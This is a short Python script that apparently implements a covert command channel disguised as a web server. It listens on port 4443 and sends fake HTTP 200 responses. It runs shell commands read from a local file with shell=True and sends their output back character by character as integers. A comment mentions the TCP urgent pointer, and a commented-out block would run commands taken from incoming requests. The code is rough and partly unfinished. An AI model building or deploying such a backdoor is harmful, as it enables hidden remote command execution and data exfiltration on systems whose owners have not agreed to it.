import socket
import time
import smtplib
import re
import json
from scapy.all import *
import os

num_arr = []
instruction_str = []
def int_to_ascii():
	for n in num_arr:
		ascii_char = str(chr(n))
		instruction_str.append(ascii_char)
		print(ascii_char)
	print(instruction_str)
	return instruction_str


def ascii_to_int(ascii_str):
        global num_arr
        num_arr.append(32)
        num_arr.append(32)
        print("at conversion %s" % (ascii_str))
        for chara in ascii_str:
                num = ord(chara)
                num_arr.append(num)
                #print(num)
        num_arr.append(32)
        num_arr.append(32)
        #print(num_arr)


def sendFile(filename):
        #f = open(filename, 'r')
        #data = f.read()
        c.sendall(str.encode("HTTP/1.0 200 OK\nContent-Type: text/html\n\r\n", 'iso-8859-1'))
        #c.sendall(str.encode('Content-Type: text/html\n', 'iso-8859-1'))
        #c.send(str.encode('\r\n'))
        #for i in range(0, len(data)):
        #        c.send(data[i].encode())
        #f.close()
# send/receive raw byte
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Socket successfully created")
port = 4443

s.bind(('', port))
print ("socket binded to %s" %(port))

s.listen(5)
print("Socket is listening")

c, addr = s.accept()
os.system("rm instr.txt")
#os.system("rm bad_instr.txt")
#while True:
#	request = c.recvfrom(4096)
#	f = open("bad_instr.txt", "w")
#	f.write(str(request))
#	print(str(request))
#	ascii_to_int(str(request))
#	string1 = "".join(int_to_ascii())
#	bad_output = subprocess.check_output(string1[5:15], shell=True)
#	print(bad_output)
#	c.send(bad_output)
#	f.close()
#	break

while True:
	global num_arr
	request = c.recvfrom(4096)
	decoding = request
	print(decoding)
	filename = 'index.html'
	sendFile(filename)
	time.sleep(.5)
	#read off the urgptr and save them, stop when 32 32
	try:
		f = open("./instr.txt", "r")
		instruction = f.read()
		f.close()
		#instr_output = os.system(instruction)
		instr_output = subprocess.check_output(instruction, shell=True)
		instr_output = str(instr_output)
		print("instr_output = %s" % (instr_output))
		print(instruction)
		print(num_arr)
		ascii_to_int(instr_output)
		print(num_arr)
		for chara in num_arr:
			string_c = str(chara)
			print("about to send char = %s" % (string_c))
			c.send(str.encode(string_c, 'iso-8859-1'))
			data1 = c.recv(1024)
			print(repr(data1))
			print("got here")
		os.system("rm instr.txt")
		num_arr = []
	except Exception as e:
		print(e)
		continue
	#run command
	#integerrize output
	#do sendmessages (while other side should be listening and have recieve sends ready)=
c.close()

